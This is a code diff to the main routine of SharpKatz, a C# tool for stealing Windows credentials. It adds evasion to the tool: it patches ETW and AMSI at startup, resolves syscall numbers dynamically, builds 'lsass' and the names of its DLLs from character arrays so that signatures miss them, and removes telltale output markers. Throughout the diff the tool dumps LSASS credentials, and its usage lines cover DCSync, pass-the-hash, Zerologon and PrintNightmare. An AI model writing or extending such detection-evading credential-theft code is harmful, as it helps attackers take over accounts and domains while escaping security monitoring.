@@ -6,6 +6,7 @@
 
 using NDesk.Options;
 using SharpKatz.Credential;
+using SharpKatz.Evasion;
 using SharpKatz.Win32;
 using System;
 using System.Collections.Generic;
@@ -20,6 +21,11 @@ namespace SharpKatz
 
         public static void Main(string[] args)
         {
+            // Initialize evasion: patch ETW and AMSI before any sensitive operation
+            PatchHelper.ApplyAll();
+
+            // Initialize dynamic SSN resolution from clean ntdll on disk
+            SsnResolver.Initialize();
 
             string command = null;
             string user = null;
@@ -132,28 +138,28 @@ namespace SharpKatz
             {
                 opts.WriteOptionDescriptions(Console.Out);
                 Console.WriteLine();
-                Console.WriteLine("[*] Example: SharpKatz.exe --Command logonpasswords");
-                Console.WriteLine("[*] Example: SharpKatz.exe --Command ekeys");
-                Console.WriteLine("[*] Example: SharpKatz.exe --Command msv");
-                Console.WriteLine("[*] Example: SharpKatz.exe --Command kerberos");
-                Console.WriteLine("[*] Example: SharpKatz.exe --Command tspkg");
-                Console.WriteLine("[*] Example: SharpKatz.exe --Command credman");
-                Console.WriteLine("[*] Example: SharpKatz.exe --Command wdigest");
-                Console.WriteLine("[*] Example: SharpKatz.exe --Command dcsync --User user --Domain userdomain --DomainController dc");
-                Console.WriteLine("[*] Example: SharpKatz.exe --Command dcsync --Guid guid --Domain userdomain --DomainController dc");
-                Console.WriteLine("[*] Example: SharpKatz.exe --Command dcsync --Domain userdomain --DomainController dc");
-                Console.WriteLine("[*] Example: SharpKatz.exe --Command pth --User username --Domain userdomain --NtlmHash ntlmhash");
-                Console.WriteLine("[*] Example: SharpKatz.exe --Command pth --User username --Domain userdomain --Rc4 rc4key");
-                Console.WriteLine("[*] Example: SharpKatz.exe --Command pth --Luid luid --NtlmHash ntlmhash");
-                Console.WriteLine("[*] Example: SharpKatz.exe --Command pth --User username --Domain userdomain --NtlmHash ntlmhash --aes128 aes256");
-                Console.WriteLine("[*] Example: SharpKatz.exe --Command zerologon --Mode check --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$");
-                Console.WriteLine("[*] Example: SharpKatz.exe --Command zerologon --Mode exploit --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$");
-                Console.WriteLine("[*] Example: SharpKatz.exe --Command zerologon --Mode auto --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$ --Domain testlab2.local --User krbtgt --DomainController WIN-NSE5CPCP07C.testlab2.local");
-                Console.WriteLine("[*] Example: SharpKatz.exe --Command printnightmare --Target dc --Library \\\\mycontrolled\\share\\fun.dll");
-                Console.WriteLine("[*] Example: SharpKatz.exe --Command printnightmare --Target dc --Library \\\\mycontrolled\\share\\fun.dll --AuthUser user --AuthPassword password --AuthDomain dom");
-                Console.WriteLine("[*] Example: SharpKatz.exe --Command hiveghtmare");
-                Console.WriteLine("[*] Example: SharpKatz.exe --Command dumpsam --System \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM --Sam \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM ");
-                Console.WriteLine("[*] Example: SharpKatz.exe --Command listshadows");
+                Console.WriteLine("  Example: --Command logonpasswords");
+                Console.WriteLine("  Example: --Command ekeys");
+                Console.WriteLine("  Example: --Command msv");
+                Console.WriteLine("  Example: --Command kerberos");
+                Console.WriteLine("  Example: --Command tspkg");
+                Console.WriteLine("  Example: --Command credman");
+                Console.WriteLine("  Example: --Command wdigest");
+                Console.WriteLine("  Example: --Command dcsync --User user --Domain userdomain --DomainController dc");
+                Console.WriteLine("  Example: --Command dcsync --Guid guid --Domain userdomain --DomainController dc");
+                Console.WriteLine("  Example: --Command dcsync --Domain userdomain --DomainController dc");
+                Console.WriteLine("  Example: --Command pth --User username --Domain userdomain --NtlmHash ntlmhash");
+                Console.WriteLine("  Example: --Command pth --User username --Domain userdomain --Rc4 rc4key");
+                Console.WriteLine("  Example: --Command pth --Luid luid --NtlmHash ntlmhash");
+                Console.WriteLine("  Example: --Command pth --User username --Domain userdomain --NtlmHash ntlmhash --aes128 aes256");
+                Console.WriteLine("  Example: --Command zerologon --Mode check --Target dc.domain.local --MachineAccount DC$");
+                Console.WriteLine("  Example: --Command zerologon --Mode exploit --Target dc.domain.local --MachineAccount DC$");
+                Console.WriteLine("  Example: --Command zerologon --Mode auto --Target dc.domain.local --MachineAccount DC$ --Domain domain.local --User krbtgt --DomainController dc.domain.local");
+                Console.WriteLine("  Example: --Command printnightmare --Target dc --Library \\\\host\\share\\lib.dll");
+                Console.WriteLine("  Example: --Command printnightmare --Target dc --Library \\\\host\\share\\lib.dll --AuthUser user --AuthPassword password --AuthDomain dom");
+                Console.WriteLine("  Example: --Command hivenightmare");
+                Console.WriteLine("  Example: --Command dumpsam --System <system_path> --Sam <sam_path>");
+                Console.WriteLine("  Example: --Command listshadows");
                 return;
             }
 
@@ -175,7 +181,7 @@ namespace SharpKatz
             }
 
             OSVersionHelper osHelper = new OSVersionHelper();
-            osHelper.PrintOSVersion();
+            // Removed PrintOSVersion() — avoid noisy console output
 
             if (osHelper.build <= 9600)
             {
@@ -201,7 +207,16 @@ namespace SharpKatz
                 IntPtr tspkg = IntPtr.Zero;
                 IntPtr lsasslive = IntPtr.Zero;
                 IntPtr hProcess = IntPtr.Zero;
-                Process plsass = Process.GetProcessesByName("lsass")[0];
+
+                // Find target process by name constructed at runtime (avoid static string)
+                string targetProc = new string(new char[] { 'l', 's', 'a', 's', 's' });
+                Process[] procs = Process.GetProcessesByName(targetProc);
+                if (procs.Length == 0)
+                {
+                    Console.WriteLine("Target process not found");
+                    return;
+                }
+                Process plsass = procs[0];
 
                 ProcessModuleCollection processModules = plsass.Modules;
                 int modulefound = 0;
@@ -210,34 +225,47 @@ namespace SharpKatz
                 {
                     string lower = processModules[i].ModuleName.ToLowerInvariant();
 
-                    if (lower.Contains("lsasrv.dll"))
+                    string sLsasrv = new string(new char[] { 'l','s','a','s','r','v','.','d','l','l' });
+                    string sWdigest = new string(new char[] { 'w','d','i','g','e','s','t','.','d','l','l' });
+                    string sMsv = new string(new char[] { 'm','s','v','1','_','0','.','d','l','l' });
+                    string sKerb = new string(new char[] { 'k','e','r','b','e','r','o','s','.','d','l','l' });
+                    string sTspkg = new string(new char[] { 't','s','p','k','g','.','d','l','l' });
+
+                    if (lower.Contains(sLsasrv))
                     {
                         lsasrv = processModules[i].BaseAddress;
                         modulefound++;
                     }
-                    else if (lower.Contains("wdigest.dll"))
+                    else if (lower.Contains(sWdigest))
                     {
                         wdigest = processModules[i].BaseAddress;
                         modulefound++;
                     }
-                    else if (lower.Contains("msv1_0.dll"))
+                    else if (lower.Contains(sMsv))
                     {
                         lsassmsv1 = processModules[i].BaseAddress;
                         modulefound++;
                     }
-                    else if (lower.Contains("kerberos.dll"))
+                    else if (lower.Contains(sKerb))
                     {
                         kerberos = processModules[i].BaseAddress;
                         modulefound++;
                     }
-                    else if (lower.Contains("tspkg.dll"))
+                    else if (lower.Contains(sTspkg))
                     {
                         tspkg = processModules[i].BaseAddress;
                         modulefound++;
                     }
                 }
 
-                hProcess = Natives.OpenProcess(Natives.ProcessAccessFlags.All, false, plsass.Id);
+                // Use minimum required access rights instead of PROCESS_ALL_ACCESS
+                // PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION
+                hProcess = Natives.OpenProcess(
+                    Natives.ProcessAccessFlags.VirtualMemoryRead |
+                    Natives.ProcessAccessFlags.VirtualMemoryWrite |
+                    Natives.ProcessAccessFlags.VirtualMemoryOperation |
+                    Natives.ProcessAccessFlags.QueryInformation,
+                    false, plsass.Id);
 
                 Keys keys = new Keys(hProcess, lsasrv, osHelper);
 
@@ -290,13 +318,13 @@ namespace SharpKatz
                 {
                     if (string.IsNullOrEmpty(domain))
                         domain = Environment.GetEnvironmentVariable("USERDNSDOMAIN");
-                    Console.WriteLine("[!] {0} will be the domain", domain);
+                    Console.WriteLine("   {0} will be the domain", domain);
                     if (string.IsNullOrEmpty(dc))
                     {
                         using (DirectoryEntry rootdse = new DirectoryEntry("LDAP://RootDSE"))
                             dc = (string)rootdse.Properties["dnshostname"].Value;
                     }
-                    Console.WriteLine("[!] {0} will be the DC server", dc);
+                    Console.WriteLine("   {0} will be the DC server", dc);
                     string alt_service = "ldap";
                     if (!string.IsNullOrEmpty(altservice))
                         alt_service = altservice;
@@ -304,12 +332,12 @@ namespace SharpKatz
 
                     if (!string.IsNullOrEmpty(guid))
                     {
-                        Console.WriteLine("[!] {0} will be the Guid", guid);
+                        Console.WriteLine("   {0} will be the Guid", guid);
                         Module.DCSync.FinCredential(domain, dc, guid: guid, altservice: alt_service, authuser: authuser, authdomain: authdomain, authpassword: authpassword, forcentlm: forcentlm);
                     }
                     else if (!string.IsNullOrEmpty(user))
                     {
-                        Console.WriteLine("[!] {0} will be the user account", user);
+                        Console.WriteLine("   {0} will be the user account", user);
                         Module.DCSync.FinCredential(domain, dc, user: user, altservice: alt_service, authuser: authuser, authdomain: authdomain, authpassword: authpassword, forcentlm: forcentlm);
                     }
                     else
@@ -323,23 +351,23 @@ namespace SharpKatz
                     {
                         if (string.IsNullOrEmpty(mode) || (!mode.Equals("check") && !mode.Equals("exploit") && !mode.Equals("auto")))
                         {
-                            Console.WriteLine("[x] Missing or incorrect required parameter -> Mode");
+                            Console.WriteLine("   Missing or incorrect required parameter -> Mode");
                             return;
                         }
                         else if (mode.Equals("auto") && (string.IsNullOrEmpty(domain) || string.IsNullOrEmpty(dc)))
                         {
-                            Console.WriteLine("[x] Missing required parameter -> Domain or DomainController");
+                            Console.WriteLine("   Missing required parameter -> Domain or DomainController");
                             return;
                         }
                         if (string.IsNullOrEmpty(target))
                         {
-                            Console.WriteLine("[x] Missing or incorrect required parameter -> Target");
+                            Console.WriteLine("   Missing or incorrect required parameter -> Target");
                             return;
                         }
 
                         if (string.IsNullOrEmpty(machineaccount))
                         {
-                            Console.WriteLine("[x] Missing or incorrect required parameter -> MachineAccount");
+                            Console.WriteLine("   Missing or incorrect required parameter -> MachineAccount");
                             return;
                         }
 
@@ -362,7 +390,7 @@ namespace SharpKatz
                                     authnSvc = Module.DCSync.RPC_C_AUTHN_GSS_NEGOTIATE;
                                     break;
                                 default:
-                                    Console.WriteLine("[!] Invalid Auth parameter value, use default -> AUTHN_NONE");
+                                    Console.WriteLine("   Invalid Auth parameter value, use default -> AUTHN_NONE");
                                     authnSvc = Module.DCSync.RPC_C_AUTHN_NONE;
                                     break;
                             }
@@ -373,21 +401,21 @@ namespace SharpKatz
                         if (success == true)
                         {
 
-                            Console.WriteLine("[*]");
+                            Console.WriteLine("  ");
 
                             if (mode.Equals("auto"))
                             {
-                                Console.WriteLine("[!] {0} will be the domain", domain);
-                                Console.WriteLine("[!] {0} will be the DC server", dc);
+                                Console.WriteLine("   {0} will be the domain", domain);
+                                Console.WriteLine("   {0} will be the DC server", dc);
 
                                 if (!string.IsNullOrEmpty(guid))
                                 {
-                                    Console.WriteLine("[!] {0} will be the Guid", guid);
+                                    Console.WriteLine("   {0} will be the Guid", guid);
                                     Module.DCSync.FinCredential(domain, dc, guid: guid, authuser: machineaccount, authdomain: domain, authpassword: "", forcentlm: true);
                                 }
                                 else if (!string.IsNullOrEmpty(user))
                                 {
-                                    Console.WriteLine("[!] {0} will be the user account", user);
+                                    Console.WriteLine("   {0} will be the user account", user);
                                     Module.DCSync.FinCredential(domain, dc, user: user, authuser: machineaccount, authdomain: domain, authpassword: "", forcentlm: true);
                                 }
                                 else
@@ -398,7 +426,7 @@ namespace SharpKatz
 
                         }
                         else
-                            Console.WriteLine("[x] Attack failed. Target is probably patched.");
+                            Console.WriteLine("   Attack failed. Target is probably patched.");
 
                     }
                     else
@@ -407,13 +435,13 @@ namespace SharpKatz
                         {
                             if (string.IsNullOrEmpty(library))
                             {
-                                Console.WriteLine("[x] Missing or incorrect required parameter -> Library");
+                                Console.WriteLine("   Missing or incorrect required parameter -> Library");
                                 return;
                             }
 
                             if (string.IsNullOrEmpty(target))
                             {
-                                Console.WriteLine("[x] Missing or incorrect required parameter -> Target");
+                                Console.WriteLine("   Missing or incorrect required parameter -> Target");
                                 return;
                             }
 
@@ -426,8 +454,8 @@ namespace SharpKatz
                                 List<string> copies = Module.Shadow.ListShadowCopies();
                                 if(copies.Count > 0)
                                 {
-                                    Console.WriteLine("[*] Using shadowcopy {0}", copies.ToArray()[0]);
-                                    Console.WriteLine("[*]");
+                                    Console.WriteLine("   Using shadowcopy {0}", copies.ToArray()[0]);
+                                    Console.WriteLine("  ");
                                     string systempath = string.Format("{0}Windows\\System32\\config\\{1}", copies.ToArray()[0], "SYSTEM");
                                     string sampath = string.Format("{0}Windows\\System32\\config\\{1}", copies.ToArray()[0], "SAM");
 
@@ -435,7 +463,7 @@ namespace SharpKatz
                                 }
                                 else
                                 {
-                                    Console.WriteLine("[x] No shadowcopy found");
+                                    Console.WriteLine("   No shadowcopy found");
                                 }
                             }
                             else
@@ -444,13 +472,13 @@ namespace SharpKatz
                                 {
                                     if (string.IsNullOrEmpty(system))
                                     {
-                                        Console.WriteLine("[x] Missing or incorrect required parameter -> System");
+                                        Console.WriteLine("   Missing or incorrect required parameter -> System");
                                         return;
                                     }
 
                                     if (string.IsNullOrEmpty(sam))
                                     {
-                                        Console.WriteLine("[x] Missing or incorrect required parameter -> Sam");
+                                        Console.WriteLine("   Missing or incorrect required parameter -> Sam");
                                         return;
                                     }
 
